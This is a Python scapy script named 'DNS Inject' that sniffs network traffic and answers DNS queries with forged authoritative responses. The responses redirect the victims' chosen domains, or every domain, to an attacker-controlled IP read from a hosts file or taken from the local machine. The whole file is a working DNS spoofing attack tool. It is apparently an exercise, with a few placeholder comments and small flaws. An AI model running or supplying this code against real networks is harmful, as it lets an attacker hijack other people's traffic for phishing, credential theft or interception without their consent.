import argparse
import os
from scapy.all import *
import socket

def check_arg():
	parser = argparse.ArgumentParser(description='DNS Inject', add_help=False)
	parser.add_argument('-i', nargs='?', action="store")
	parser.add_argument('-h', nargs='?', action="store")
	parser.add_argument('filter', nargs='*',action="store")
	args = parser.parse_args()

	return args.i, args.h, args.filter

def dns_inject(packet):
	# ........................ Check which ones are victims..........................
	# ........................ Get redirect_to .....................................
	#print(packet)
	spoofFlag=1
	if(packet.haslayer(DNSQR) and packet[DNS].ancount==0):
		if(hostFlag==0):
			domain = packet[DNS].qd.qname.decode('ASCII').rsplit('.', 1)[0]
			if(domain in host.keys()):
				redirect_to = host[domain]
			else:
				spoofFlag = 0
		else:
			redirect_to = host
		if(spoofFlag==1):
			spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                             UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                             DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1, \
                             an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=redirect_to))
			send(spoofed_pkt)

if __name__ == '__main__':
	interface,hostfile,expression = check_arg()
	hostFlag=0
	iFlag=0
	if(interface!=None):
		## .....................Write code to get default interface..................
		#interface='ens33'
		iFlag=1
	if(hostfile==None):
		## ....................Write code to get local machine IP address
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		try:
			s.connect(('8.8.8.8', 80))
		except socket.error:
			host = '192.168.10.133'
		host =  s.getsockname()[0]
		hostFlag=1
	else:
		f = open(hostfile,"r")
		host = {}
		for line in f:
			hostline = line.split()
			host[hostline[1]] = hostline[0]

	if not expression:
		expression=""
	if(iFlag==1):
		sniff(filter=expression, iface=interface, store=0, prn=dns_inject)
	else:
		sniff(filter=expression, store=0, prn=dns_inject)
	print('interface =',interface)
	print('filename =',hostfile)
	print('filter =',expression) 
